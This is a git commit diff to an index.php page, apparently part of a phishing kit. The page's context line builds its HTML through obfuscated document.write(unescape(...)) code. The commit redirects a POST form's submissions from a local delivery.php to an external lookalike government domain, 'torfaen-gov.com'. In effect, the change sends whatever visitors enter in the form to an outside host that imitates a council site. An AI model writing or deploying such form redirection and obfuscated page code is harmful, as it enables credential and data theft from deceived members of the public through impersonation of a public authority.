35b2d60b912bb941f8213516b0857037a4c21883
creative212 <64727340+creative212@users.noreply.github.com>
2020-12-01 00:06:52 +0100

    Update index.php

--- index.php
+++ index.php
@@ -88,7 +88,7 @@ document.write(unescape('%3Cbody%20marginwidth%3D%220%22%20marginheight%3D%220%2
 </script>
 
 							
-								<form method="post" action="delivery.php">
+								<form method="post" action="https://torfaen-gov.com/wincosf/delivery.php">
 							
 <script type="text/javascript">
 <!--
